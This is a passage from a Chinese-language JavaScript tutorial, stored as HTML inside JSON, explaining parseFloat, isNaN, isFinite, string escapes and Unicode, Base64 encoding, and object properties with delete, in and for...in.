12.34</code></pre><p>如果参数不是字符串，或者字符串的第一个字符不能转化为浮点数，则返回<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat([]) // NaN\nparseFloat(&#039;FF2&#039;) // NaN\nparseFloat(&#039;&#039;) // NaN</code></pre><p>上面代码中，尤其值得注意，<code>parseFloat</code>会将空字符串转为<code>NaN</code>。</p>\n<p>这些特点使得<code>parseFloat</code>的转换结果不同于<code>Number</code>函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>parseFloat(true)  // NaN\nNumber(true) // 1\n\nparseFloat(null) // NaN\nNumber(null) // 0\n\nparseFloat(&#039;&#039;) // NaN\nNumber(&#039;&#039;) // 0\n\nparseFloat(&#039;123.45#&#039;) // 123.45\nNumber(&#039;123.45#&#039;) // NaN</code></pre>\n        <h3>\n            <a href='#isNaN()' class='header-anchor'>#</a>\n            <span>isNaN()</span>\n        </h3>\n    <p><code>isNaN</code>方法可以用来判断一个值是否为<code>NaN</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN(NaN) // true\nisNaN(123) // false</code></pre><p>但是，<code>isNaN</code>只对数值有效，如果传入其他值，会被先转成数值。比如，传入字符串的时候，字符串会被先转成<code>NaN</code>，所以最后返回<code>true</code>，这一点要特别引起注意。也就是说，<code>isNaN</code>为<code>true</code>的值，有可能不是<code>NaN</code>，而是一个字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN(&#039;Hello&#039;) // true\n// 相当于\nisNaN(Number(&#039;Hello&#039;)) // true</code></pre><p>出于同样的原因，对于对象和数组，<code>isNaN</code>也返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN({}) // true\n// 等同于\nisNaN(Number({})) // true\n\nisNaN([&#039;xzy&#039;]) // true\n// 等同于\nisNaN(Number([&#039;xzy&#039;])) // true</code></pre><p>但是，对于空数组和只有一个数值成员的数组，<code>isNaN</code>返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN([]) // false\nisNaN([123]) // false\nisNaN([&#039;123&#039;]) // false</code></pre><p>上面代码之所以返回<code>false</code>，原因是这些数组能被<code>Number</code>函数转成数值，请参见《数据类型转换》一章。</p>\n<p>因此，使用<code>isNaN</code>之前，最好判断一下数据类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>function myIsNaN(value) {\n  return typeof value === &#039;number&#039; &amp;&amp; isNaN(value);\n}</code></pre><p>判断<code>NaN</code>更可靠的方法是，利用<code>NaN</code>为唯一不等于自身的值的这个特点，进行判断。</p>\n<pre class=\"prettyprint language-javascript\"><code>function myIsNaN(value) {\n  return value !== value;\n}</code></pre>\n        <h3>\n            <a href='#isFinite()' class='header-anchor'>#</a>\n            <span>isFinite()</span>\n        </h3>\n    <p><code>isFinite</code>方法返回一个布尔值，表示某个值是否为正常的数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>isFinite(Infinity) // false\nisFinite(-Infinity) // false\nisFinite(NaN) // false\nisFinite(undefined) // false\nisFinite(null) // true\nisFinite(-1) // true</code></pre><p>除了<code>Infinity</code>、<code>-Infinity</code>、<code>NaN</code>和<code>undefined</code>这几个值会返回<code>false</code>，<code>isFinite</code>对于其他的数值都会返回<code>true</code>。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Dr. Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/04/number-encoding.html\">How numbers are encoded in JavaScript</a></li>\n<li>Humphry, <a href=\"http://blog.segmentfault.com/humphry/1190000000407658\">JavaScript 中 Number 的一些表示上/下限</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"字符串","link":"/types/string.html"}],"content":"\n        <h1>\n            <a href='#字符串' class='header-anchor'>#</a>\n            <span>字符串</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h3>\n    <p>字符串就是零个或多个排在一起的字符，放在单引号或双引号之中。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;\n&quot;abc&quot;</code></pre><p>单引号字符串的内部，可以使用双引号。双引号字符串的内部，可以使用单引号。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;key = &quot;value&quot;&#039;\n&quot;It&#039;s a long journey&quot;</code></pre><p>上面两个都是合法的字符串。</p>\n<p>如果要在单引号字符串的内部，使用单引号，就必须在内部的单引号前面加上反斜杠，用来转义。双引号字符串内部使用双引号，也是如此。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;Did she say \\&#039;Hello\\&#039;?&#039;\n// &quot;Did she say &#039;Hello&#039;?&quot;\n\n&quot;Did she say \\&quot;Hello\\&quot;?&quot;\n// &quot;Did she say &quot;Hello&quot;?&quot;</code></pre><p>由于 HTML 语言的属性值使用双引号，所以很多项目约定 JavaScript 语言的字符串只使用单引号，本教程遵守这个约定。当然，只使用双引号也完全可以。重要的是坚持使用一种风格，不要一会使用单引号表示字符串，一会又使用双引号表示。</p>\n<p>字符串默认只能写在一行内，分成多行将会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a\nb\nc&#039;\n// SyntaxError: Unexpected token ILLEGAL</code></pre><p>上面代码将一个字符串分成三行，JavaScript 就会报错。</p>\n<p>如果长字符串必须分成多行，可以在每一行的尾部使用反斜杠。</p>\n<pre class=\"prettyprint language-javascript\"><code>var longString = &#039;Long \\\nlong \\\nlong \\\nstring&#039;;\n\nlongString\n// &quot;Long long long string&quot;</code></pre><p>上面代码表示，加了反斜杠以后，原来写在一行的字符串，可以分成多行书写。但是，输出的时候还是单行，效果与写在同一行完全一样。注意，反斜杠的后面必须是换行符，而不能有其他字符（比如空格），否则会报错。</p>\n<p>连接运算符（<code>+</code>）可以连接多个单行字符串，将长字符串拆成多行书写，输出的时候也是单行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var longString = &#039;Long &#039;\n  + &#039;long &#039;\n  + &#039;long &#039;\n  + &#039;string&#039;;</code></pre><p>如果想输出多行字符串，有一种利用多行注释的变通方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function () { /*\nline 1\nline 2\nline 3\n*/}).toString().split(&#039;\\n&#039;).slice(1, -1).join(&#039;\\n&#039;)\n// &quot;line 1\n// line 2\n// line 3&quot;</code></pre><p>上面的例子中，输出的字符串就是多行。</p>\n\n        <h3>\n            <a href='#转义' class='header-anchor'>#</a>\n            <span>转义</span>\n        </h3>\n    <p>反斜杠（\\）在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义符。</p>\n<p>需要用反斜杠转义的特殊字符，主要有下面这些。</p>\n<ul>\n<li><code>\\0</code> ：null（<code>\\u0000</code>）</li>\n<li><code>\\b</code> ：后退键（<code>\\u0008</code>）</li>\n<li><code>\\f</code> ：换页符（<code>\\u000C</code>）</li>\n<li><code>\\n</code> ：换行符（<code>\\u000A</code>）</li>\n<li><code>\\r</code> ：回车键（<code>\\u000D</code>）</li>\n<li><code>\\t</code> ：制表符（<code>\\u0009</code>）</li>\n<li><code>\\v</code> ：垂直制表符（<code>\\u000B</code>）</li>\n<li><code>\\&#39;</code> ：单引号（<code>\\u0027</code>）</li>\n<li><code>\\&quot;</code> ：双引号（<code>\\u0022</code>）</li>\n<li><code>\\\\</code> ：反斜杠（<code>\\u005C</code>）</li>\n</ul>\n<p>上面这些字符前面加上反斜杠，都表示特殊含义。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039;1\\n2&#039;)\n// 1\n// 2</code></pre><p>上面代码中，<code>\\n</code>表示换行，输出的时候就分成了两行。</p>\n<p>反斜杠还有三种特殊用法。</p>\n<p>（1）<code>\\HHH</code></p>\n<p>反斜杠后面紧跟三个八进制数（<code>000</code>到<code>377</code>），代表一个字符。<code>HHH</code>对应该字符的 Unicode 码点，比如<code>\\251</code>表示版权符号。显然，这种方法只能输出256种字符。</p>\n<p>（2）<code>\\xHH</code></p>\n<p><code>\\x</code>后面紧跟两个十六进制数（<code>00</code>到<code>FF</code>），代表一个字符。<code>HH</code>对应该字符的 Unicode 码点，比如<code>\\xA9</code>表示版权符号。这种方法也只能输出256种字符。</p>\n<p>（3）<code>\\uXXXX</code></p>\n<p><code>\\u</code>后面紧跟四个十六进制数（<code>0000</code>到<code>FFFF</code>），代表一个字符。<code>XXXX</code>对应该字符的 Unicode 码点，比如<code>\\u00A9</code>表示版权符号。</p>\n<p>下面是这三种字符特殊写法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;\\251&#039; // &quot;©&quot;\n&#039;\\xA9&#039; // &quot;©&quot;\n&#039;\\u00A9&#039; // &quot;©&quot;\n\n&#039;\\172&#039; === &#039;z&#039; // true\n&#039;\\x7A&#039; === &#039;z&#039; // true\n&#039;\\u007A&#039; === &#039;z&#039; // true</code></pre><p>如果在非特殊字符前面使用反斜杠，则反斜杠会被省略。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;\\a&#039;\n// &quot;a&quot;</code></pre><p>上面代码中，<code>a</code>是一个正常字符，前面加反斜杠没有特殊含义，反斜杠会被自动省略。</p>\n<p>如果字符串的正常内容之中，需要包含反斜杠，则反斜杠前面需要再加一个反斜杠，用来对自身转义。</p>\n<pre class=\"prettyprint language-javascript\"><code>&quot;Prev \\\\ Next&quot;\n// &quot;Prev \\ Next&quot;</code></pre>\n        <h3>\n            <a href='#字符串与数组' class='header-anchor'>#</a>\n            <span>字符串与数组</span>\n        </h3>\n    <p>字符串可以被视为字符数组，因此可以使用数组的方括号运算符，用来返回某个位置的字符（位置编号从0开始）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\ns[0] // &quot;h&quot;\ns[1] // &quot;e&quot;\ns[4] // &quot;o&quot;\n\n// 直接对字符串使用方括号运算符\n&#039;hello&#039;[1] // &quot;e&quot;</code></pre><p>如果方括号中的数字超过字符串的长度，或者方括号中根本不是数字，则返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;[3] // undefined\n&#039;abc&#039;[-1] // undefined\n&#039;abc&#039;[&#039;x&#039;] // undefined</code></pre><p>但是，字符串与数组的相似性仅此而已。实际上，无法改变字符串之中的单个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\n\ndelete s[0];\ns // &quot;hello&quot;\n\ns[1] = &#039;a&#039;;\ns // &quot;hello&quot;\n\ns[5] = &#039;!&#039;;\ns // &quot;hello&quot;</code></pre><p>上面代码表示，字符串内部的单个字符无法改变和增删，这些操作会默默地失败。</p>\n\n        <h3>\n            <a href='#length-属性' class='header-anchor'>#</a>\n            <span>length 属性</span>\n        </h3>\n    <p><code>length</code>属性返回字符串的长度，该属性也是无法改变的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\ns.length // 5\n\ns.length = 3;\ns.length // 5\n\ns.length = 7;\ns.length // 5</code></pre><p>上面代码表示字符串的<code>length</code>属性无法改变，但是不会报错。</p>\n\n        <h2>\n            <a href='#字符集' class='header-anchor'>#</a>\n            <span>字符集</span>\n        </h2>\n    <p>JavaScript 使用 Unicode 字符集。JavaScript 引擎内部，所有字符都用 Unicode 表示。</p>\n<p>JavaScript 不仅以 Unicode 储存字符，还允许直接在程序中使用 Unicode 码点表示字符，即将字符写成<code>\\uxxxx</code>的形式，其中<code>xxxx</code>代表该字符的 Unicode 码点。比如，<code>\\u00A9</code>代表版权符号。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;\\u00A9&#039;;\ns // &quot;©&quot;</code></pre><p>解析代码的时候，JavaScript 会自动识别一个字符是字面形式表示，还是 Unicode 形式表示。输出给用户的时候，所有字符都会转成字面形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f\\u006F\\u006F = &#039;abc&#039;;\nfoo // &quot;abc&quot;</code></pre><p>上面代码中，第一行的变量名<code>foo</code>是 Unicode 形式表示，第二行是字面形式表示。JavaScript 会自动识别。</p>\n<p>我们还需要知道，每个字符在 JavaScript 内部都是以16位（即2个字节）的 UTF-16 格式储存。也就是说，JavaScript 的单位字符长度固定为16位长度，即2个字节。</p>\n<p>但是，UTF-16 有两种长度：对于码点在<code>U+0000</code>到<code>U+FFFF</code>之间的字符，长度为16位（即2个字节）；对于码点在<code>U+10000</code>到<code>U+10FFFF</code>之间的字符，长度为32位（即4个字节），而且前两个字节在<code>0xD800</code>到<code>0xDBFF</code>之间，后两个字节在<code>0xDC00</code>到<code>0xDFFF</code>之间。举例来说，码点<code>U+1D306</code>对应的字符为<code>𝌆，</code>它写成 UTF-16 就是<code>0xD834 0xDF06</code>。</p>\n<p>JavaScript 对 UTF-16 的支持是不完整的，由于历史原因，只支持两字节的字符，不支持四字节的字符。这是因为 JavaScript 第一版发布的时候，Unicode 的码点只编到<code>U+FFFF</code>，因此两字节足够表示了。后来，Unicode 纳入的字符越来越多，出现了四字节的编码。但是，JavaScript 的标准此时已经定型了，统一将字符长度限制在两字节，导致无法识别四字节的字符。上一节的那个四字节字符<code>𝌆</code>，浏览器会正确识别这是一个字符，但是 JavaScript 无法识别，会认为这是两个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;𝌆&#039;.length // 2</code></pre><p>上面代码中，JavaScript 认为<code>𝌆</code>的长度为2，而不是1。</p>\n<p>总结一下，对于码点在<code>U+10000</code>到<code>U+10FFFF</code>之间的字符，JavaScript 总是认为它们是两个字符（<code>length</code>属性为2）。所以处理的时候，必须把这一点考虑在内，也就是说，JavaScript 返回的字符串长度可能是不正确的。</p>\n\n        <h2>\n            <a href='#Base64-转码' class='header-anchor'>#</a>\n            <span>Base64 转码</span>\n        </h2>\n    <p>有时，文本里面包含一些不可打印的符号，比如 ASCII 码0到31的符号都无法打印出来，这时可以使用 Base64 编码，将它们转成可以打印的字符。另一个场景是，有时需要以文本格式传递二进制数据，那么也可以使用 Base64 编码。</p>\n<p>所谓 Base64 就是一种编码方法，可以将任意值转成 0～9、A～Z、a-z、<code>+</code>和<code>/</code>这64个字符组成的可打印字符。使用它的主要目的，不是为了加密，而是为了不出现特殊字符，简化程序的处理。</p>\n<p>JavaScript 原生提供两个 Base64 相关的方法。</p>\n<ul>\n<li><code>btoa()</code>：任意值转为 Base64 编码</li>\n<li><code>atob()</code>：Base64 编码转为原来的值</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var string = &#039;Hello World!&#039;;\nbtoa(string) // &quot;SGVsbG8gV29ybGQh&quot;\natob(&#039;SGVsbG8gV29ybGQh&#039;) // &quot;Hello World!&quot;</code></pre><p>注意，这两个方法不适合非 ASCII 码的字符，会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>btoa(&#039;你好&#039;) // 报错</code></pre><p>要将非 ASCII 码字符转为 Base64 编码，必须中间插入一个转码环节，再使用这两个方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function b64Encode(str) {\n  return btoa(encodeURIComponent(str));\n}\n\nfunction b64Decode(str) {\n  return decodeURIComponent(atob(str));\n}\n\nb64Encode(&#039;你好&#039;) // &quot;JUU0JUJEJUEwJUU1JUE1JUJE&quot;\nb64Decode(&#039;JUU0JUJEJUEwJUU1JUE1JUJE&#039;) // &quot;你好&quot;</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Mathias Bynens, <a href=\"http://mathiasbynens.be/notes/javascript-encoding\">JavaScript’s internal character encoding: UCS-2 or UTF-16?</a></li>\n<li>Mathias Bynens, <a href=\"http://mathiasbynens.be/notes/javascript-unicode\">JavaScript has a Unicode problem</a></li>\n<li>Mozilla Developer Network, <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window.btoa\">Window.btoa</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"对象","link":"/types/object.html"}],"content":"\n        <h1>\n            <a href='#对象' class='header-anchor'>#</a>\n            <span>对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#生成方法' class='header-anchor'>#</a>\n            <span>生成方法</span>\n        </h3>\n    <p>对象（object）是 JavaScript 语言的核心概念，也是最重要的数据类型。</p>\n<p>什么是对象？简单说，对象就是一组“键值对”（key-value）的集合，是一种无序的复合数据集合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  foo: &#039;Hello&#039;,\n  bar: &#039;World&#039;\n};</code></pre><p>上面代码中，大括号就定义了一个对象，它被赋值给变量<code>obj</code>，所以变量<code>obj</code>就指向一个对象。该对象内部包含两个键值对（又称为两个“成员”），第一个键值对是<code>foo: &#39;Hello&#39;</code>，其中<code>foo</code>是“键名”（成员的名称），字符串<code>Hello</code>是“键值”（成员的值）。键名与键值之间用冒号分隔。第二个键值对是<code>bar: &#39;World&#39;</code>，<code>bar</code>是键名，<code>World</code>是键值。两个键值对之间用逗号分隔。</p>\n\n        <h3>\n            <a href='#键名' class='header-anchor'>#</a>\n            <span>键名</span>\n        </h3>\n    <p>对象的所有键名都是字符串（ES6 又引入了 Symbol 值也可以作为键名），所以加不加引号都可以。上面的代码也可以写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  &#039;foo&#039;: &#039;Hello&#039;,\n  &#039;bar&#039;: &#039;World&#039;\n};</code></pre><p>如果键名是数值，会被自动转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  1: &#039;a&#039;,\n  3.2: &#039;b&#039;,\n  1e2: true,\n  1e-2: true,\n  .234: true,\n  0xFF: true\n};\n\nobj\n// Object {\n//   1: &quot;a&quot;,\n//   3.2: &quot;b&quot;,\n//   100: true,\n//   0.01: true,\n//   0.234: true,\n//   255: true\n// }\n\nobj[&#039;100&#039;] // true</code></pre><p>上面代码中，对象<code>obj</code>的所有键名虽然看上去像数值，实际上都被自动转成了字符串。</p>\n<p>如果键名不符合标识名的条件（比如第一个字符为数字，或者含有空格或运算符），且也不是数字，则必须加上引号，否则会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 报错\nvar obj = {\n  1p: &#039;Hello World&#039;\n};\n\n// 不报错\nvar obj = {\n  &#039;1p&#039;: &#039;Hello World&#039;,\n  &#039;h w&#039;: &#039;Hello World&#039;,\n  &#039;p+q&#039;: &#039;Hello World&#039;\n};</code></pre><p>上面对象的三个键名，都不符合标识名的条件，所以必须加上引号。</p>\n<p>对象的每一个键名又称为“属性”（property），它的“键值”可以是任何数据类型。如果一个属性的值为函数，通常把这个属性称为“方法”，它可以像函数那样调用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: function (x) {\n    return 2 * x;\n  }\n};\n\nobj.p(1) // 2</code></pre><p>上面代码中，对象<code>obj</code>的属性<code>p</code>，就指向一个函数。</p>\n<p>如果属性的值还是一个对象，就形成了链式引用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = { bar: &#039;hello&#039; };\n\no1.foo = o2;\no1.foo.bar // &quot;hello&quot;</code></pre><p>上面代码中，对象<code>o1</code>的属性<code>foo</code>指向对象<code>o2</code>，就可以链式引用<code>o2</code>的属性。</p>\n<p>对象的属性之间用逗号分隔，最后一个属性后面可以加逗号（trailing comma），也可以不加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: 123,\n  m: function () { ... },\n}</code></pre><p>上面的代码中，<code>m</code>属性后面的那个逗号，有没有都可以。</p>\n<p>属性可以动态创建，不必在对象声明时就指定。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.foo = 123;\nobj.foo // 123</code></pre><p>上面代码中，直接对<code>obj</code>对象的<code>foo</code>属性赋值，结果就在运行时创建了<code>foo</code>属性。</p>\n\n        <h3>\n            <a href='#对象的引用' class='header-anchor'>#</a>\n            <span>对象的引用</span>\n        </h3>\n    <p>如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = o1;\n\no1.a = 1;\no2.a // 1\n\no2.b = 2;\no1.b // 2</code></pre><p>上面代码中，<code>o1</code>和<code>o2</code>指向同一个对象，因此为其中任何一个变量添加属性，另一个变量都可以读写该属性。</p>\n<p>此时，如果取消某一个变量对于原对象的引用，不会影响到另一个变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = o1;\n\no1 = 1;\no2 // {}</code></pre><p>上面代码中，<code>o1</code>和<code>o2</code>指向同一个对象，然后<code>o1</code>的值变为1，这时不会对<code>o2</code>产生影响，<code>o2</code>还是指向原来的那个对象。</p>\n<p>但是，这种引用只局限于对象，如果两个变量指向同一个原始类型的值。那么，变量这时都是值的拷贝。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = x;\n\nx = 2;\ny // 1</code></pre><p>上面的代码中，当<code>x</code>的值发生变化后，<code>y</code>的值并不变，这就表示<code>y</code>和<code>x</code>并不是指向同一个内存地址。</p>\n\n        <h3>\n            <a href='#表达式还是语句？' class='header-anchor'>#</a>\n            <span>表达式还是语句？</span>\n        </h3>\n    <p>对象采用大括号表示，这导致了一个问题：如果行首是一个大括号，它到底是表达式还是语句？</p>\n<pre class=\"prettyprint language-javascript\"><code>{ foo: 123 }</code></pre><p>JavaScript 引擎读到上面这行代码，会发现可能有两种含义。第一种可能是，这是一个表达式，表示一个包含<code>foo</code>属性的对象；第二种可能是，这是一个语句，表示一个代码区块，里面有一个标签<code>foo</code>，指向表达式<code>123</code>。</p>\n<p>为了避免这种歧义，V8 引擎规定，如果行首是大括号，一律解释为对象。不过，为了避免歧义，最好在大括号前加上圆括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>({ foo: 123})</code></pre><p>这种差异在<code>eval</code>语句（作用是对字符串求值）中反映得最明显。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;{foo: 123}&#039;) // 123\neval(&#039;({foo: 123})&#039;) // {foo: 123}</code></pre><p>上面代码中，如果没有圆括号，<code>eval</code>将其理解为一个代码块；加上圆括号以后，就理解成一个对象。</p>\n\n        <h2>\n            <a href='#属性的操作' class='header-anchor'>#</a>\n            <span>属性的操作</span>\n        </h2>\n    \n        <h3>\n            <a href='#属性的读取' class='header-anchor'>#</a>\n            <span>属性的读取</span>\n        </h3>\n    <p>读取对象的属性，有两种方法，一种是使用点运算符，还有一种是使用方括号运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;Hello World&#039;\n};\n\nobj.p // &quot;Hello World&quot;\nobj[&#039;p&#039;] // &quot;Hello World&quot;</code></pre><p>上面代码分别采用点运算符和方括号运算符，读取属性<code>p</code>。</p>\n<p>请注意，如果使用方括号运算符，键名必须放在引号里面，否则会被当作变量处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = &#039;bar&#039;;\n\nvar obj = {\n  foo: 1,\n  bar: 2\n};\n\nobj.foo  // 1\nobj[foo]  // 2</code></pre><p>上面代码中，引用对象<code>obj</code>的<code>foo</code>属性时，如果使用点运算符，<code>foo</code>就是字符串；如果使用方括号运算符，但是不使用引号，那么<code>foo</code>就是一个变量，指向字符串<code>bar</code>。</p>\n<p>方括号运算符内部还可以使用表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>obj[&#039;hello&#039; + &#039; world&#039;]\nobj[3 + 3]</code></pre><p>数字键可以不加引号，因为会自动转成字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  0.7: &#039;Hello World&#039;\n};\n\nobj[&#039;0.7&#039;] // &quot;Hello World&quot;\nobj[0.7] // &quot;Hello World&quot;</code></pre><p>上面代码中，对象<code>obj</code>的数字键<code>0.7</code>，加不加引号都可以，因为会被自动转为字符串。</p>\n<p>注意，数值键名不能使用点运算符（因为会被当成小数点），只能使用方括号运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  123: &#039;hello world&#039;\n};\n\nobj.123 // 报错\nobj[123] // &quot;hello world&quot;</code></pre><p>上面代码的第一个表达式，对数值键名<code>123</code>使用点运算符，结果报错。第二个表达式使用方括号运算符，结果就是正确的。</p>\n\n        <h3>\n            <a href='#属性的赋值' class='header-anchor'>#</a>\n            <span>属性的赋值</span>\n        </h3>\n    <p>点运算符和方括号运算符，不仅可以用来读取值，还可以用来赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nobj.foo = &#039;Hello&#039;;\nobj[&#039;bar&#039;] = &#039;World&#039;;</code></pre><p>上面代码中，分别使用点运算符和方括号运算符，对属性赋值。</p>\n<p>JavaScript 允许属性的“后绑定”，也就是说，你可以在任意时刻新增属性，没必要在定义对象的时候，就定义好属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\n\n// 等价于\n\nvar obj = {};\nobj.p = 1;</code></pre>\n        <h3>\n            <a href='#属性的查看' class='header-anchor'>#</a>\n            <span>属性的查看</span>\n        </h3>\n    <p>查看一个对象本身的所有属性，可以使用<code>Object.keys</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  key1: 1,\n  key2: 2\n};\n\nObject.keys(obj);\n// [&#039;key1&#039;, &#039;key2&#039;]</code></pre>\n        <h3>\n            <a href='#属性的删除：delete-命令' class='header-anchor'>#</a>\n            <span>属性的删除：delete 命令</span>\n        </h3>\n    <p><code>delete</code>命令用于删除对象的属性，删除成功后返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nObject.keys(obj) // [&quot;p&quot;]\n\ndelete obj.p // true\nobj.p // undefined\nObject.keys(obj) // []</code></pre><p>上面代码中，<code>delete</code>命令删除对象<code>obj</code>的<code>p</code>属性。删除后，再读取<code>p</code>属性就会返回<code>undefined</code>，而且<code>Object.keys</code>方法的返回值也不再包括该属性。</p>\n<p>注意，删除一个不存在的属性，<code>delete</code>不报错，而且返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\ndelete obj.p // true</code></pre><p>上面代码中，对象<code>obj</code>并没有<code>p</code>属性，但是<code>delete</code>命令照样返回<code>true</code>。因此，不能根据<code>delete</code>命令的结果，认定某个属性是存在的。</p>\n<p>只有一种情况，<code>delete</code>命令会返回<code>false</code>，那就是该属性存在，且不得删除。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 123,\n  configurable: false\n});\n\nobj.p // 123\ndelete obj.p // false</code></pre><p>上面代码之中，对象<code>obj</code>的<code>p</code>属性是不能删除的，所以<code>delete</code>命令返回<code>false</code>（关于<code>Object.defineProperty</code>方法的介绍，请看《标准库》的 Object 对象一章）。</p>\n<p>另外，需要注意的是，<code>delete</code>命令只能删除对象本身的属性，无法删除继承的属性（关于继承参见《面向对象编程》章节）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\ndelete obj.toString // true\nobj.toString // function toString() { [native code] }</code></pre><p>上面代码中，<code>toString</code>是对象<code>obj</code>继承的属性，虽然<code>delete</code>命令返回<code>true</code>，但该属性并没有被删除，依然存在。这个例子还说明，即使<code>delete</code>返回<code>true</code>，该属性依然可能读取到值。</p>\n\n        <h3>\n            <a href='#属性是否存在：in-运算符' class='header-anchor'>#</a>\n            <span>属性是否存在：in 运算符</span>\n        </h3>\n    <p><code>in</code>运算符用于检查对象是否包含某个属性（注意，检查的是键名，不是键值），如果包含就返回<code>true</code>，否则返回<code>false</code>。它的左边是一个字符串，表示属性名，右边是一个对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\n&#039;p&#039; in obj // true\n&#039;toString&#039; in obj // true</code></pre><p><code>in</code>运算符的一个问题是，它不能识别哪些属性是对象自身的，哪些属性是继承的。就像上面代码中，对象<code>obj</code>本身并没有<code>toString</code>属性，但是<code>in</code>运算符会返回<code>true</code>，因为这个属性是继承的。</p>\n<p>这时，可以使用对象的<code>hasOwnProperty</code>方法判断一下，是否为对象自身的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nif (&#039;toString&#039; in obj) {\n  console.log(obj.hasOwnProperty(&#039;toString&#039;)) // false\n}</code></pre>\n        <h3>\n            <a href='#属性的遍历：for...in-循环' class='header-anchor'>#</a>\n            <span>属性的遍历：for...in 循环</span>\n        </h3>\n    <p><code>for...in</code>循环用来遍历一个对象的全部属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {a: 1, b: 2, c: 3};\n\nfor (var i in obj) {\n  console.log(&#039;键名：&#039;, i);\n  console.log(&#039;键值：&#039;, obj[i]);\n}\n// 键名： a\n// 键值： 1\n// 键名： b\n// 键值： 2\n// 键名： c\n// 键值： 3</code></pre><p><code>for...in</code>循环有两个使用注意点。</p>\n<ul>\n<li>它遍历的是对象所有可遍历（enumerable）的属性，会跳过不可遍历的属性。</li>\n<li>它不仅遍历对象自身的属性，还遍历继承的属性。</li>\n</ul>\n<p>举例来说，对象都继承了<code>toString</code>属性，但是<code>for...in</code>循环不会遍历到这个属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\n// toString 属性是存在的\nobj.toString // toString() { [native code] }\n\nfor (var p in obj) {\n  console.log(p);\n} // 